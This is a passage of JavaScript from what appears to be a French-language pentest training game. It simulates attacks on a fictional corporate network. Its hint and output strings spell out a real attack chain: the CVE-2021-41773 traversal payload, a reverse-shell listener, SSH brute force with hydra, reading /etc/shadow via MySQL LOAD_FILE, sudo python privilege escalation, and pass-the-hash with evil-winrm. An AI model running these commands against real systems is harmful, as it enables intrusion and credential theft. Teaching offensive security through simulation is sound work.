// ─── Machine definitions ──────────────────────────────────────────────────────

const MACHINES = [
  {
    id: 'webserver',
    ip: '192.168.1.10',
    name: 'Web Server',
    icon: '🌐',
    type: 'server',
    difficulty: 'easy',
    os: 'Ubuntu 20.04',
    services: ['HTTP:80', 'HTTPS:443', 'SSH:22'],
    locked: false,
    unlockedBy: [],
    connections: ['dbserver'],
    description: 'Serveur web Apache 2.4.49. Point d\'entrée principal.',
    flag: 'CQ{w3b_s3rv3r_pwn3d}',
    hints: [
      'Apache 2.4.49 est vulnérable à CVE-2021-41773 (Path Traversal + RCE)',
      'nikto ou searchsploit apache 2.4.49 pour trouver l\'exploit',
      'Mets un listener nc -lvnp 4444 avant de lancer l\'exploit',
    ]
  },
  {
    id: 'mailserver',
    ip: '192.168.1.20',
    name: 'Mail Server',
    icon: '📧',
    type: 'server',
    difficulty: 'medium',
    os: 'Debian 11',
    services: ['SMTP:25', 'IMAP:143', 'SSH:22'],
    locked: false,
    unlockedBy: [],
    connections: ['dbserver'],
    description: 'Serveur mail Postfix. Contient des credentials de base de données.',
    flag: 'CQ{m41l_s3rv3r_0wn3d}',
    hints: [
      'VRFY activée → smtp-user-enum pour lister les comptes',
      'Aucun fail2ban → brute-force SSH possible avec hydra',
      'Cherche les credentials DB dans les emails et configs Postfix',
    ]
  },
  {
    id: 'dbserver',
    ip: '192.168.1.30',
    name: 'DB Server',
    icon: '🗄',
    type: 'server',
    difficulty: 'medium',
    os: 'CentOS 7',
    services: ['MySQL:3306', 'SSH:22'],
    locked: true,
    unlockedBy: ['webserver', 'mailserver'],
    connections: ['dc'],
    description: 'Base de données MySQL. Credentials trouvés sur les machines précédentes.',
    flag: 'CQ{db_dump_g0t}',
    hints: [
      'Credentials : db_user:Str0ngP@ss (trouvés en exploitant web ou mail)',
      'mysql -h 192.168.1.30 -u db_user -pStr0ngP@ss',
      'FILE privilege activé → SELECT LOAD_FILE(\'/etc/shadow\')',
    ]
  },
  {
    id: 'dc',
    ip: '192.168.1.100',
    name: 'Domain Controller',
    icon: '👑',
    type: 'boss',
    difficulty: 'hard',
    os: 'Windows Server 2019',
    services: ['SMB:445', 'WinRM:5985', 'LDAP:389', 'Kerberos:88', 'RDP:3389'],
    locked: true,
    unlockedBy: ['dbserver'],
    connections: [],
    description: 'Active Directory. Hash NTLM extrait du DB Server.',
    flag: 'CQ{d0m41n_4dm1n_pwn3d}',
    hints: [
      'Hash Administrator NTLM extrait via secretsdump sur le DB Server',
      'evil-winrm -i 192.168.1.100 -u Administrator -H <ntlm_hash>',
      'Pass-the-Hash : pas besoin du mot de passe en clair',
    ]
  }
];

// ─── Scenarios par machine ────────────────────────────────────────────────────

const MACHINE_SCENARIOS = {
  webserver: {
    phase_recon: {
      xp: 20,
      reveals: [
        'Apache/2.4.49 (Ubuntu) — version identifiée',
        'Port 80/tcp open  http    Apache httpd 2.4.49',
        'Page /cgi-bin/ accessible (CGI activé !)',
        '/robots.txt : Disallow: /backup/, /admin/',
      ]
    },
    phase_scan: {
      xp: 30,
      reveals: [
        '\x1b[31mCVE-2021-41773 : Path Traversal + RCE sur Apache 2.4.49 !\x1b[0m',
        'CVSS 9.8 — Critique. PoC public disponible.',
        '/backup/db.sql.gz accessible sans auth',
        'Module mod_cgi activé → RCE possible via Path Traversal',
      ]
    },
    phase_exploit: {
      xp: 50,
      reveals: [
        'Payload : /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh',
        'RCE confirmée : uid=33(www-data) gid=33(www-data)',
        'Reverse shell établi sur 10.0.0.1:4444',
        '/var/www/html/config.php → db_user:Str0ngP@ss trouvé !',
      ]
    },
    phase_post: {
      xp: 80,
      reveals: [
        'sudo -l : (root) NOPASSWD: /usr/bin/python3',
        'PrivEsc → sudo python3 -c \'import os; os.system("/bin/bash")\'',
        'root@web-server:~# whoami → root',
        '\x1b[32m🚩 FLAG : CQ{w3b_s3rv3r_pwn3d}\x1b[0m',
      ],
      unlocksMachines: ['dbserver'],
      flag: 'CQ{w3b_s3rv3r_pwn3d}'
    }
  },

  mailserver: {
    phase_recon: {
      xp: 20,
      reveals: [
        '220 mail.corp.local ESMTP Postfix 3.5.6',
        'VRFY admin → 252 admin@corp.local (énumération possible)',
        'VRFY john → 252 john@corp.local',
        'Domaine interne : corp.local | Aucun fail2ban détecté',
      ]
    },
    phase_scan: {
      xp: 30,
      reveals: [
        'smtp-user-enum : admin, john, backup, postmaster',
        'SSH port 22 ouvert → brute-force possible',
        'Politique de mots de passe faible (aucun lockout)',
        'IMAP accessible → lecture des emails si credentials obtenus',
      ]
    },
    phase_exploit: {
      xp: 50,
      reveals: [
        'hydra → admin:letmein trouvé après 237 tentatives',
        'Connexion SSH : admin@192.168.1.20',
        'Email de john : "DB creds: db_user / Str0ngP@ss"',
        '/etc/postfix/main.cf → credentials LDAP : ldap_bind:C0rpS3cr3t',
      ]
    },
    phase_post: {
      xp: 60,
      reveals: [
        'Emails sensibles exfiltrés (RH, finances, credentials)',
        'Credentials DB confirmés : db_user:Str0ngP@ss',
        'Hash shadow admin : $6$... (cracké : letmein)',
        '\x1b[32m🚩 FLAG : CQ{m41l_s3rv3r_0wn3d}\x1b[0m',
      ],
      unlocksMachines: ['dbserver'],
      flag: 'CQ{m41l_s3rv3r_0wn3d}'
    }
  },

  dbserver: {
    phase_recon: {
      xp: 15,
      reveals: [
        'MySQL 5.7.38 — connexion établie',
        'mysql> show databases;',
        '+--------------------+',
        '| information_schema |',
        '| corp_db            |',
        '| employees          |',
        '+--------------------+',
      ]
    },
    phase_scan: {
      xp: 25,
      reveals: [
        'mysql> use corp_db; show tables;',
        '| employees | users | credentials | secrets |',
        'FILE privilege : ACTIVÉ (dangereux !)',
        'mysql> SELECT user, file_priv FROM mysql.user WHERE user=\'db_user\';',
        '| db_user | Y |   ← FILE privs actives',
      ]
    },
    phase_exploit: {
      xp: 70,
      reveals: [
        'mysql> SELECT * FROM credentials;',
        '| Administrator | aad3b435b51404eeaad3b435b51404ee:5f4dcc3b... |',
        '\x1b[31mHash NTLM Administrator extrait !\x1b[0m',
        'mysql> SELECT LOAD_FILE(\'/etc/shadow\'); → succès (root hash récupéré)',
      ]
    },
    phase_post: {
      xp: 80,
      reveals: [
        'mysqldump corp_db → 450 enregistrements exfiltrés',
        'NTLM Hash : aad3b435b51404eeaad3b435b51404ee',
        'Pivot vers Domain Controller maintenant possible',
        '\x1b[32m🚩 FLAG : CQ{db_dump_g0t}\x1b[0m',
      ],
      unlocksMachines: ['dc'],
      flag: 'CQ{db_dump_g0t}'
    }
  },

  dc: {
    phase_recon: {
      xp: 20,
      reveals: [
        '*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>',
        'whoami /all → CORP\\Administrator (Domain Admins, Schema Admins)',
        'Domain : CORP.LOCAL | DC : dc.corp.local',
        'net user /domain → 47 comptes de domaine',
      ]
    },
    phase_scan: {
      xp: 40,
      reveals: [
        'net localgroup "Domain Admins" → Administrator, svc_backup',
        'ldapsearch : 3 OUs, 2 GPO, Kerberoasting potentiel',
        '\x1b[31mSMB signing DISABLED → Pass-the-Hash confirmé\x1b[0m',
        'BloodHound : chemin DA trouvé via svc_sql → Administrator',
      ]
    },
    phase_exploit: {
      xp: 100,
      reveals: [
        'secretsdump.py → NTDS.dit dump en cours...',
        'Administrator:500:aad3b435b51404ee:5f4dcc3b5aa765d61d8327de... [TOUS les hashes]',
        'krbtgt hash récupéré → Golden Ticket possible',
        'Domaine CORP.LOCAL entièrement compromis',
      ]
    },
    phase_post: {
      xp: 150,
      reveals: [
        'Persistance : Golden Ticket créé (10 ans)',
        'DCSync : tous les hashes du domaine exfiltrés',
        'CORP.LOCAL → neutralisé. 47 comptes exposés.',
        '\x1b[33m🏆 FLAG FINAL : CQ{d0m41n_4dm1n_pwn3d}\x1b[0m',
      ],
      unlocksMachines: [],
      flag: 'CQ{d0m41n_4dm1n_pwn3d}',
      gameWin: true
    }
  }
};

// ─── Helpers ──────────────────────────────────────────────────────────────────

function getMachineByIP(ip) {
  return MACHINES.find(m => m.ip === ip) || null;
}

function getMachineByIdOrName(val) {
  return MACHINES.find(m => m.id === val || m.name.toLowerCase() === val.toLowerCase()) || null;
}

function getPhaseName(p) {
  return ['Reconnaissance', 'Scanning', 'Exploitation', 'Post-Exploitation', 'Terminée'][p] || 'Inconnue';
}

function isLocked(machine, state) {
  return machine.locked && !state.unlockedMachines.includes(machine.id);
}

function hasDBCreds(state) {
  return state.pwnedMachines.includes('webserver') || state.pwnedMachines.includes('mailserver');
}

function hasDCHash(state) {
  return state.pwnedMachines.includes('dbserver');
}

function enterMachine(machine, extraLines, peda, xp, state) {
  return {
    output: extraLines.join('\n'),
    pedagogie: peda,
    effect: { type: 'ENTER_MACHINE', machine },
    xpBonus: xp,
    stateChanges: {
      mode: 'MACHINE',
      currentMachine: machine,
      machinePhase: 0,
      rootObtained: false,
    }
  };
}

// ─── Network mode ─────────────────────────────────────────────────────────────

function handleNetwork(cmd, args, state) {
  const joined = args.join(' ');

  // ── help ──
  if (cmd === 'help') {
    return {
      output: [
        '\x1b[33m╔══════════════════════════════════════════════════╗\x1b[0m',
        '\x1b[33m║   COMMANDES — Réseau CorpNet (192.168.1.0/24)    ║\x1b[0m',
        '\x1b[33m╚══════════════════════════════════════════════════╝\x1b[0m',
        '',
        '\x1b[36mRECONNAISSANCE\x1b[0m',
        '  nmap 192.168.1.0/24          Ping scan du réseau',
        '  nmap -sV <ip>                Scan de versions/services',
        '  nmap -sC -sV -p- <ip>        Scan complet',
        '',
        '\x1b[36mACCÈS INITIAL — Web Server\x1b[0m',
        '  nc -lvnp 4444                Ouvrir un listener (reverse shell)',
        '  python3 exploit.py <ip> 4444 Lancer l\'exploit CVE-2021-41773',
        '',
        '\x1b[36mACCÈS INITIAL — Mail Server\x1b[0m',
        '  hydra -l admin -P rockyou.txt <ip> ssh   Brute-force SSH',
        '  ssh admin@<ip>               Connexion SSH',
        '',
        '\x1b[36mPIVOT — DB Server (après web ou mail)\x1b[0m',
        '  mysql -h <ip> -u db_user -pStr0ngP@ss    Connexion MySQL',
        '',
        '\x1b[36mPIVOT — Domain Controller (après DB)\x1b[0m',
        '  evil-winrm -i <ip> -u Administrator -H <ntlm_hash>',
        '',
        '\x1b[36mAUTRES\x1b[0m',
        '  ls / whoami / hint / scores',
        '',
        '\x1b[33m📍 CHAÎNE D\'ATTAQUE :\x1b[0m',
        '  nmap → nc -lvnp → python3 exploit.py → [dans web] → mysql → evil-winrm',
      ].join('\n'),
      pedagogie: 'Un pentest suit la chaîne : Recon → Scan → Accès initial → Post-exploitation → Pivot → Objectif. Chaque phase s\'appuie sur les infos de la précédente.',
      effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── hint ──
  if (cmd === 'hint') {
    const pwned = state.pwnedMachines || [];
    const scanned = state.scannedMachines || [];

    if (scanned.length === 0) {
      return {
        output: [
          '\x1b[33m💡 INDICE — Début :\x1b[0m',
          '',
          '  Étape 1 : \x1b[36mnmap 192.168.1.0/24\x1b[0m  → découvrir les machines',
          '  Étape 2 : \x1b[36mnmap -sV 192.168.1.10\x1b[0m → scanner le Web Server',
          '  Étape 3 : \x1b[36mnc -lvnp 4444\x1b[0m         → préparer un listener',
          '  Étape 4 : \x1b[36mpython3 exploit.py 192.168.1.10 4444\x1b[0m → reverse shell',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    if (!pwned.includes('webserver')) {
      return {
        output: [
          '\x1b[33m💡 INDICE — Web Server (CVE-2021-41773) :\x1b[0m',
          '',
          '  1. \x1b[36mnmap -sV 192.168.1.10\x1b[0m',
          '  2. \x1b[36mnc -lvnp 4444\x1b[0m              ← listener reverse shell',
          '  3. \x1b[36mpython3 cve-2021-41773.py 192.168.1.10 4444\x1b[0m',
          '  4. Dans le shell → \x1b[36mrecon\x1b[0m, \x1b[36mnmap\x1b[0m, \x1b[36mexploit\x1b[0m, \x1b[36msudo -l\x1b[0m, \x1b[36mcat /flag.txt\x1b[0m',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    if (!pwned.includes('mailserver') && !pwned.includes('dbserver')) {
      return {
        output: [
          '\x1b[33m💡 INDICE — Mail Server :\x1b[0m',
          '',
          '  1. \x1b[36mnmap -sV 192.168.1.20\x1b[0m',
          '  2. \x1b[36mhydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.20 ssh\x1b[0m',
          '  3. \x1b[36mssh admin@192.168.1.20\x1b[0m',
          '  4. Dans le shell → \x1b[36mrecon\x1b[0m, \x1b[36mnmap\x1b[0m, \x1b[36mexploit\x1b[0m, \x1b[36mcat /flag.txt\x1b[0m',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    if (!pwned.includes('dbserver')) {
      return {
        output: [
          '\x1b[33m💡 INDICE — DB Server :\x1b[0m',
          '',
          '  Tu as les credentials DB depuis la machine précédente :',
          '  \x1b[36mmysql -h 192.168.1.30 -u db_user -pStr0ngP@ss\x1b[0m',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    if (!pwned.includes('dc')) {
      return {
        output: [
          '\x1b[33m💡 INDICE — Domain Controller :\x1b[0m',
          '',
          '  Tu as extrait le hash NTLM Administrator du DB Server.',
          '  \x1b[36mevil-winrm -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee\x1b[0m',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    return {
      output: '\x1b[32m🏆 Toutes les machines ont été compromises !\x1b[0m Tape "scores".',
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── ls ──
  if (cmd === 'ls') {
    const visible = MACHINES.filter(m =>
      !isLocked(m, state) || state.scannedMachines.includes(m.id)
    );
    const lines = visible.map(m => {
      const st = state.pwnedMachines.includes(m.id) ? '\x1b[32m[PWNED]  \x1b[0m' :
                 state.scannedMachines.includes(m.id) ? '\x1b[33m[SCANNÉ] \x1b[0m' : '\x1b[34m[VISIBLE]\x1b[0m';
      const lock = isLocked(m, state) ? ' 🔒' : '';
      return `  ${m.ip.padEnd(16)} ${st} ${m.name}${lock}`;
    });
    return {
      output: ['Réseau CorpNet — hôtes connus :', '', ...lines, '', '\x1b[33mnmap 192.168.1.0/24 pour un scan complet\x1b[0m'].join('\n'),
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── whoami ──
  if (cmd === 'whoami' || cmd === 'id') {
    return {
      output: [
        '\x1b[31mattacker\x1b[0m@\x1b[33mkali\x1b[0m — IP : 10.0.0.1 (Kali Linux)',
        `Réseau cible   : 192.168.1.0/24 (CorpNet)`,
        `Machines pwned : ${state.pwnedMachines.length} / ${MACHINES.length}`,
        `Listener actif : ${state.listenerPort ? `port ${state.listenerPort}` : 'aucun'}`,
        `Score XP       : ${state.xp}`,
      ].join('\n'),
      pedagogie: 'whoami est la première commande à taper après chaque pivot : vérifier son identité, ses privilèges, et son contexte réseau.',
      effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── nmap ──
  if (cmd === 'nmap') {
    if (joined.includes('/24') || args.includes('-sn') || joined.includes('0/24')) {
      const newScanned = MACHINES
        .filter(m => !isLocked(m, state) && !state.scannedMachines.includes(m.id))
        .map(m => m.id);
      return {
        output: [
          'Starting Nmap 7.94SVN ( https://nmap.org )',
          'Nmap scan report for 192.168.1.1    (Firewall)    → filtered',
          '\x1b[32mNmap scan report for 192.168.1.10\x1b[0m  (Web Server)  → open: 80,443,22',
          '\x1b[32mNmap scan report for 192.168.1.20\x1b[0m  (Mail Server) → open: 25,143,22',
          'Nmap scan report for 192.168.1.30  (DB Server)  → filtered (réseau interne)',
          'Nmap scan report for 192.168.1.100 (DC)         → filtered (réseau interne)',
          '',
          '5 hosts up — 2 accessibles directement, 3 filtrés',
          '',
          '\x1b[33m💡 Lance un scan de versions sur les cibles accessibles :\x1b[0m',
          '   \x1b[36mnmap -sV 192.168.1.10\x1b[0m',
          '   \x1b[36mnmap -sV 192.168.1.20\x1b[0m',
          '',
          '\x1b[35mORACLE > Deux cibles directes : Web Server et Mail Server. Commence par le web.\x1b[0m',
        ].join('\n'),
        pedagogie: 'nmap -sn (ping scan) découvre les hôtes actifs sans scanner les ports. Rapide et discret. Pour la détection de services : nmap -sV. Pour tout scanner : nmap -sC -sV -p-.',
        effect: { type: 'SCAN_NETWORK', discovered: ['webserver', 'mailserver'] },
        xpBonus: 30,
        stateChanges: {
          scannedMachines: [...new Set([...state.scannedMachines, ...newScanned, 'webserver', 'mailserver'])]
        }
      };
    }

    const ip = args.find(a => /192\.168\.1\.\d+/.test(a));
    if (ip) {
      const machine = getMachineByIP(ip);
      if (!machine) return { output: `Nmap: ${ip} — host seems down.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
      if (isLocked(machine, state)) {
        return {
          output: `\x1b[31mNmap: ${ip} — filtered (réseau interne inaccessible depuis ta position)\x1b[0m\nPivote depuis une machine compromise pour accéder au réseau interne.`,
          pedagogie: 'Le pivoting (tunneling SSH, proxy SOCKS5, chisel) permet d\'accéder à des réseaux internes via une machine compromise. Technique fondamentale en pentest.',
          effect: null, xpBonus: 0, stateChanges: {}
        };
      }
      const portLines = machine.services.map(s => {
        const [svc, port] = s.split(':');
        return `${(port + '/tcp').padEnd(10)} open  ${svc}`;
      });
      return {
        output: [
          `Starting Nmap 7.94SVN against ${ip}`,
          `Host is up (0.011s latency).`,
          '',
          'PORT       STATE SERVICE',
          ...portLines,
          '',
          `OS: ${machine.os}`,
          '',
          `\x1b[32m[+] ${machine.name} identifié — ${machine.os}\x1b[0m`,
          `\x1b[33m💡 Lance nikto ou searchsploit pour trouver des vulnérabilités\x1b[0m`,
        ].join('\n'),
        pedagogie: 'nmap -sV détecte les versions des services. Combiner avec -sC (scripts NSE) et -O (OS detection). Sauvegarder les résultats avec -oN scan.txt pour le rapport.',
        effect: { type: 'SCAN_MACHINE', machineId: machine.id },
        xpBonus: 15,
        stateChanges: { scannedMachines: [...new Set([...state.scannedMachines, machine.id])] }
      };
    }
    return { output: 'Usage: nmap 192.168.1.0/24   ou   nmap -sV <ip>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  // ── nc -lvnp : préparer un listener pour reverse shell ──
  if (cmd === 'nc') {
    const listenFlags = ['-lvnp', '-lnvp', '-lvp', '-l'];
    const isListen = listenFlags.some(f => args.includes(f)) || args.some(a => /^-.*l/.test(a));
    if (isListen) {
      const portArg = args.find(a => /^\d{2,5}$/.test(a));
      const port = portArg || '4444';
      return {
        output: [
          `\x1b[32mlistening on [any] ${port} ...\x1b[0m`,
          '',
          '\x1b[33m💡 Listener TCP actif. Lance l\'exploit pour déclencher la connexion :\x1b[0m',
          `\x1b[36m   python3 cve-2021-41773.py 192.168.1.10 ${port}\x1b[0m`,
          '',
          '\x1b[37m(Le reverse shell se connectera automatiquement quand l\'exploit réussit)\x1b[0m',
        ].join('\n'),
        pedagogie: 'nc -lvnp crée un serveur TCP en écoute. Quand l\'exploit déclenche un reverse shell sur la victime, celle-ci se connecte vers l\'attaquant, contournant ainsi les firewalls entrants (qui bloquent les connexions entrantes mais autorisent les sortantes).',
        effect: null, xpBonus: 10,
        stateChanges: { listenerPort: parseInt(port) || 4444 }
      };
    }
    return { output: 'Usage: nc -lvnp <port>   (pour préparer un listener reverse shell)', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  // ── python3 exploit.py : CVE-2021-41773 → reverse shell sur web server ──
  if (cmd === 'python3' || cmd === 'python') {
    const ip = args.find(a => /192\.168\.1\.\d+/.test(a));
    const hasExploit = args.some(a => /exploit|cve|41773|shell|payload|rce/i.test(a));

    if (!ip || !hasExploit) {
      return {
        output: [
          'Usage: python3 <exploit_script> <ip> <port>',
          'Exemple: python3 cve-2021-41773.py 192.168.1.10 4444',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    const machine = getMachineByIP(ip);
    if (!machine || machine.id !== 'webserver') {
      return { output: `\x1b[31m[!] Aucun exploit disponible pour ${ip}.\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (!state.scannedMachines.includes('webserver')) {
      return { output: '\x1b[31m[!] Scanne d\'abord le Web Server : nmap -sV 192.168.1.10\x1b[0m', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    const port = args.find(a => /^\d{4,5}$/.test(a)) || state.listenerPort || 4444;
    const listenerNote = state.listenerPort
      ? `\x1b[32m[+] Connexion entrante sur listener :${state.listenerPort} ✓\x1b[0m`
      : '\x1b[33m[!] Aucun listener nc détecté. En réel : lance nc -lvnp 4444 d\'abord.\x1b[0m    (simulation : reverse shell déclenché quand même)\x1b[0m';

    const webMachine = MACHINES.find(m => m.id === 'webserver');
    return enterMachine(webMachine, [
      `\x1b[36m[*] Envoi du payload CVE-2021-41773 vers ${ip}:80...\x1b[0m`,
      `\x1b[36m[*] GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh\x1b[0m`,
      `\x1b[36m[*] POST data: echo;id\x1b[0m`,
      '',
      `\x1b[32m[+] RCE confirmée ! uid=33(www-data) gid=33(www-data)\x1b[0m`,
      listenerNote,
      `\x1b[32m[+] REVERSE SHELL ÉTABLI → 10.0.0.1:${port}\x1b[0m`,
      '',
      '\x1b[32m╔══════════════════════════════════════════════════╗\x1b[0m',
      `\x1b[32m║  🌐 SHELL — Web Server (${ip})              ║\x1b[0m`,
      '\x1b[32m╚══════════════════════════════════════════════════╝\x1b[0m',
      '',
      `  OS       : Ubuntu 20.04 / Apache 2.4.49`,
      `  User     : www-data (uid=33)`,
      `  Listener : 10.0.0.1:${port}`,
      '',
      '\x1b[33m━━━ PHASE 1 : RECONNAISSANCE ━━━━━━━━━━━━━━━━━━━━━\x1b[0m',
      '  recon / id / uname -a / ls -la / cat /etc/os-release',
      '',
      '\x1b[35mORACLE > Reverse shell actif. Tape : id  pour vérifier le contexte.\x1b[0m',
    ],
    'CVE-2021-41773 : Path Traversal sur Apache 2.4.49 qui permet de traverser les répertoires hors du DocumentRoot et, quand mod_cgi est actif, d\'exécuter du code. Le reverse shell connecte la victime vers l\'attaquant — les firewalls laissent passer les connexions sortantes.',
    25, state);
  }

  // ── hydra : brute-force SSH sur mail server ──
  if (cmd === 'hydra') {
    const ip = args.find(a => /192\.168\.1\.\d+/.test(a));
    if (!ip) return { output: 'Usage: hydra -l <user> -P <wordlist> <ip> ssh', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const machine = getMachineByIP(ip);
    if (!machine) return { output: `hydra: ${ip} — hôte inaccessible.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (!state.scannedMachines.includes(machine.id)) {
      return { output: `\x1b[31m[!] Scanne d\'abord : nmap -sV ${ip}\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (isLocked(machine, state)) {
      return { output: `\x1b[31mhydra: ${ip} — connexion refusée (réseau interne).\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    if (machine.id === 'mailserver') {
      return {
        output: [
          `\x1b[36mHydra v9.4 starting — brute-force SSH on ${ip}\x1b[0m`,
          '[DATA] max 16 tasks per 1 server',
          '[DATA] attacking ssh://192.168.1.20:22/',
          '[STATUS] attack finished for 192.168.1.20 (valid pair found at position 237)',
          '',
          `\x1b[32m[22][ssh] host: ${ip}   login: admin   password: letmein\x1b[0m`,
          '',
          '1 of 1 target successfully completed, 1 valid password found',
          '',
          '\x1b[33m💡 Credentials SSH trouvés ! Connecte-toi :\x1b[0m',
          `\x1b[36m   ssh admin@${ip}\x1b[0m`,
        ].join('\n'),
        pedagogie: 'Hydra est un cracker de mots de passe réseau multi-protocoles. -l = login unique, -L = liste de logins, -p = mot de passe unique, -P = wordlist. rockyou.txt (14M mots de passe) est la référence. fail2ban ou un rate-limit SSH bloque cette attaque en production.',
        effect: null, xpBonus: 30,
        stateChanges: { hydraDone: true }
      };
    }

    return {
      output: [
        `\x1b[31mHydra: aucun résultat sur ${machine.ip} — fail2ban actif ou politique de compte trop stricte.\x1b[0m`,
        'Essaie une autre approche pour cette machine.',
      ].join('\n'),
      pedagogie: 'fail2ban bloque les IPs après N tentatives échouées. Alternatives : credential stuffing, password spraying (1 mot de passe pour N comptes), ou exploitation de vulnérabilités applicatives.',
      effect: null, xpBonus: 5, stateChanges: {}
    };
  }

  // ── ssh user@ip ──
  if (cmd === 'ssh') {
    const atTarget = args.find(a => a.includes('@'));
    let user = null, ip = null;
    if (atTarget) {
      const parts = atTarget.split('@');
      user = parts[0]; ip = parts[1];
    } else {
      const lIdx = args.indexOf('-l');
      if (lIdx !== -1) user = args[lIdx + 1];
      ip = args.find(a => /192\.168\.1\.\d+/.test(a));
    }

    if (!ip) return { output: 'Usage: ssh user@<ip>   ou   ssh -l user <ip>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const machine = getMachineByIP(ip);
    if (!machine) return { output: `ssh: connect to host ${ip} port 22: No route to host`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (isLocked(machine, state)) {
      return { output: `\x1b[31mssh: connect to host ${ip} port 22: Connection refused\x1b[0m\nRéseau interne inaccessible depuis ta position.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (!state.scannedMachines.includes(machine.id)) {
      return { output: `\x1b[31m[!] Machine non scannée. Lance d\'abord : nmap -sV ${ip}\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    if (machine.id === 'mailserver') {
      if (!state.hydraDone && !state.pwnedMachines.includes('mailserver')) {
        return {
          output: [
            `\x1b[31m${user || 'admin'}@${ip}: Permission denied (publickey,password).\x1b[0m`,
            '',
            '\x1b[33m💡 Mot de passe inconnu. Brute-force d\'abord :\x1b[0m',
            `\x1b[36m   hydra -l admin -P /usr/share/wordlists/rockyou.txt ${ip} ssh\x1b[0m`,
          ].join('\n'),
          pedagogie: 'SSH rejette les connexions sans le bon mot de passe. Le brute-force avec Hydra est la méthode quand aucune autre vulnérabilité n\'est exploitable sur SSH directement.',
          effect: null, xpBonus: 0, stateChanges: {}
        };
      }

      const mailMachine = MACHINES.find(m => m.id === 'mailserver');
      return enterMachine(mailMachine, [
        `The authenticity of host '${ip}' can't be established.`,
        `RSA key fingerprint is SHA256:xK9mN2p4Y7qR3sT8vW1uX6oZ5bA2cE0dF.`,
        'Are you sure you want to continue connecting (yes/no/[fingerprint])? yes',
        `Warning: Permanently added '${ip}' (RSA) to the list of known hosts.`,
        `admin@${ip}'s password: `,
        '',
        '\x1b[32mLinux mail-server 5.10.0-19-amd64 #1 SMP Debian 5.10.149\x1b[0m',
        '',
        '\x1b[32m╔══════════════════════════════════════════════════╗\x1b[0m',
        `\x1b[32m║  📧 SSH SHELL — Mail Server (${ip})         ║\x1b[0m`,
        '\x1b[32m╚══════════════════════════════════════════════════╝\x1b[0m',
        '',
        `  OS   : Debian 11 / Postfix 3.5.6`,
        `  User : admin@mail-server`,
        '',
        '\x1b[33m━━━ PHASE 1 : RECONNAISSANCE ━━━━━━━━━━━━━━━━━━━━━\x1b[0m',
        '  recon / id / uname -a / cat /etc/postfix/main.cf',
        '',
        '\x1b[35mORACLE > Connexion SSH établie. Fouille le serveur mail.\x1b[0m',
      ],
      'SSH (Secure Shell) donne un shell interactif chiffré sur la machine distante. Après brute-force des credentials, on obtient un accès complet au niveau de privilège de l\'utilisateur compromis.',
      20, state);
    }

    if (!machine.services.some(s => s.startsWith('SSH'))) {
      return { output: `\x1b[31mssh: connect to host ${ip} port 22: Connection refused\x1b[0m\n${machine.name} n\'accepte pas SSH. Utilise la bonne méthode.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    return { output: `\x1b[31m${user || 'root'}@${ip}: Permission denied (publickey,password).\x1b[0m\nTrouve d\'abord les credentials pour cette machine.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  // ── mysql : connexion au DB Server ──
  if (cmd === 'mysql') {
    const hIdx = args.indexOf('-h');
    const ip = hIdx !== -1 ? args[hIdx + 1] : args.find(a => /192\.168\.1\.\d+/.test(a));

    if (!ip) return { output: 'Usage: mysql -h <ip> -u <user> -p<password>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const machine = getMachineByIP(ip);
    if (!machine || machine.id !== 'dbserver') {
      return { output: `mysql: Can't connect to MySQL server on '${ip}': Connection refused`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (isLocked(machine, state)) {
      return {
        output: `\x1b[31mmysql: Can't connect to MySQL server on '${ip}' (111): Connection refused\x1b[0m\nRéseau interne inaccessible. Compromets d\'abord le Web Server ou le Mail Server.`,
        pedagogie: 'MySQL (3306) est généralement sur un réseau interne non routable. Pour y accéder : tunnel SSH (ssh -L 3306:192.168.1.30:3306 admin@pivot), proxy SOCKS5, ou chisel.',
        effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    if (!hasDBCreds(state)) {
      return {
        output: [
          `\x1b[31mERROR 1045 (28000): Access denied for user 'root'@'10.0.0.1' (using password: NO)\x1b[0m`,
          '',
          '\x1b[33m💡 Credentials MySQL non encore découverts.\x1b[0m',
          '   Compromets d\'abord le Web Server ou le Mail Server — les credentials DB',
          '   apparaissent dans les fichiers de config et emails internes.',
        ].join('\n'),
